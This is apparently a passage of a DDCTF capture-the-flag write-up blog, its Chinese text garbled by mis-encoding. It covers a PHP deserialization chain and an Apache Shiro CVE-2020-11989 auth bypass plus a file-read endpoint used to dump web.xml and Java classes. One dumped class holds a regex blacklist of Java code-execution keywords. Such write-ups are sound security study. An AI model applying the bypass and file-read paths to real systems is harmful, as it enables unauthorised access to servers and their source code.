class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> ShowOff();</span><br><span class="line"><span class="variable">$bullet</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bullet&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$bullet</span>))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Give Me Something!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$bullet</span> == <span class="string">&#x27;phpinfo&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$infos</span> = <span class="keyword">new</span> Info();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$obstacle1</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line">    <span class="variable">$obstacle2</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line">    <span class="variable">$mc</span> = <span class="keyword">new</span> MyClass();</span><br><span class="line">    <span class="variable">$mc</span>-&gt;flag = <span class="string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;</span><br><span class="line">    @unserialize(<span class="variable">$bullet</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$mc</span>-&gt;get_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è®¿é—®hint.php</p>
<p>å¾—åˆ°ï¼š<code>Good Job! You&#39;ve got the preffix of the flag: DDCTF&#123;VgQN6HXC2moDAq39And i&#39;ll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!</code></p>
<p>çœ‹æ ·å­æ˜¯è¦è®©æˆ‘ä»¬åˆ©ç”¨GMPæ‰“ä»–</p>
<p>è¿™é‡Œä¸æ€¥å…ˆåˆ†æä¸€ä¸‹ä»£ç ï¼Œæ„æ€ä¸€ä¸‹å¯ä»¥åˆ©ç”¨çš„ååºåˆ—åŒ–é“¾</p>
<p><code>ShowOff::__wakeup-&gt;MiddleMan::__unset-&gt;$func();</code> </p>
<p>ä»¤<code>$func=[MyClass,&quot;get_flag&quot;]</code>å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œç»“æŸï¼ˆGMPå°±ä¸è§äº†ï¼Œç›²çŒœå‡ºé¢˜äººæ²¡é™åˆ¶å¥½ï¼‰</p>
<h2 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h2><p>ç¬¬ä¸€æ¬¡ç†¬å¤œæ é¢˜ï¼ŒçœŸçˆ½</p>
<p>ç™»é™†å¤±è´¥åå“åº”ä½“å‡ºç°ï¼š<code>RememberMe=DeleteMe</code>ï¼Œshiroç¨³äº†</p>
<p>å°è¯•ä¸€ä¸‹Shiro ååºåˆ—åŒ–ï¼Œæœç„¶GG</p>
<p><a target="_blank" rel="noopener" href="https://shiro.apache.org/security-reports.html">https://shiro.apache.org/security-reports.html</a></p>
<p>å»å®˜ç½‘çœ‹ä¸‹CVEï¼Œè¯•ä¸€ä¸‹å‘ç°å­˜åœ¨CVE-2020-11989</p>
<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index</a></p>
<p>ç»•è¿‡æƒé™éªŒè¯ï¼Œå‘ç°ä»»æ„æ–‡ä»¶è¯»å–æ¥å£</p>
<p><code>http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=static/hello.jpg</code></p>
<p>ï¼ˆåŸæœ¬æ˜¯æƒ³ç›´æ¥è¯»å–Shiroçš„keyæ¥ç›´æ¥æ‰“ç©¿çš„ï¼Œæäº†å¥½ä¹…éƒ½æ²¡æ‰¾åˆ°ï¼‰</p>
<p>å¸¸è§„æ€è·¯ï¼š</p>
<ol>
<li><p>å…ˆè¯»å– web.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span> <span class="attr">metadata-complete</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-core.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.util.WebAppRootListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.util.IntrospectorCleanupListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-web.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>safeFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.ctf.util.SafeFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>safeFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>targetFilterLifecycle<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/hacker.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>403<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/hacker.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>ä¾æ¬¡è¯»å–classæ–‡ä»¶ï¼š<br><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SafeFilter</span></span></span><br><span class="line"><span class="class">  <span class="keyword">implements</span> <span class="title">Filter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> String encoding = <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> String[] blacklists = &#123; <span class="string">&quot;java.+lang&quot;</span>, <span class="string">&quot;Runtime|Process|byte|OutputStream|session|\&quot;|&#x27;&quot;</span>, <span class="string">&quot;exec.*\\(&quot;</span>, <span class="string">&quot;write|read&quot;</span>, <span class="string">&quot;invoke.*\\(&quot;</span>, <span class="string">&quot;\\.forName.*\\(&quot;</span>, <span class="string">&quot;lookup.*\\(&quot;</span>, <span class="string">&quot;\\.getMethod.*\\(&quot;</span>, <span class="string">&quot;javax.+script.+ScriptEngineManager&quot;</span>, <span class="string">&quot;com.+fasterxml&quot;</span>, <span class="string">&quot;org.+apache&quot;</span>, <span class="string">&quot;org.+hibernate&quot;</span>, <span class="string">&quot;org.+thymeleaf&quot;</span>, <span class="string">&quot;javassist&quot;</span>, <span class="string">&quot;javax\\.&quot;</span>, <span class="string">&quot;eval.*\\(&quot;</span>, <span class="string">&quot;\\.getClass\\(&quot;</span>, <span class="string">&quot;org.+springframework&quot;</span>, <span class="string">&quot;javax.+el&quot;</span>, <span class="string">&quot;java.+io&quot;</span> &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">  </span>&#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain filterChain)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ServletException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    Enumeration pNames = request.getParameterNames();</span><br><span class="line">    <span class="keyword">while</span> (pNames.hasMoreElements())</span><br><span class="line">    &#123;</span><br><span class="line">      String name = (String)pNames.nextElement();</span><br><span class="line">      String value = request.getParameter(name);</span><br><span class="line">      <span class="keyword">for</span> (String blacklist : blacklists)</span><br><span class="line">      &#123;</span><br><span class="line">        Matcher matcher = Pattern.compile(blacklist, <span class="number">34</span>).matcher(value);</span><br><span class="line">        <span class="keyword">if</span> (matcher.find())</span><br><span class="line">        &#123;</span><br><span class="line">          HttpServletResponse servletResponse = (HttpServletResponse)response;</span><br><span class="line">          servletResponse.sendError(<span class="number">403</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    filterChain.doFilter(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åå…¶ä»–çš„è¢«wafè¿‡æ»¤äº†<br>è¯»å–web.xmlä¸­çš„å…¶ä»–é…ç½®æ–‡ä»¶</p>
<p><a target="_blank" rel="noopener" href="http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml">http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/spring-core.xml</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:jee</span>=<span class="string">&quot;http://www.springframework.org/schema/jee&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:tx</span>=<span class="string">&quot;http://www.springframework.org/schema/tx&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/jee http://www.springframework.org/schema/jee/spring-jee-4.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;classpath:spring-shiro.xml&quot;</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- å£°æ˜è‡ªåŠ¨ä¸ºspringå®¹å™¨ä¸­é‚£äº›é…ç½®@Aspectjåˆ‡é¢çš„beanåˆ›å»ºä»£ç†ï¼Œç»‡å…¥åˆ‡é¢ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:aspectj-autoproxy</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- æ”¯æŒäº‹ç‰©æ³¨è§£ï¼ˆ@Transactionalï¼‰ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tx:annotation-driven</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;viewResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring4.view.ThymeleafViewResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;order&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;characterEncoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateEngine&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;templateEngine&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;templateEngine&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring4.SpringTemplateEngine&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateResolver&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;templateResolver&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;templateResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring4.templateresolver.SpringResourceTemplateResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/templates/&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.html&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateMode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;HTML5&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cacheable&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;characterEncoding&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:annotation-config</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.ctf&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Service&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Repository&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

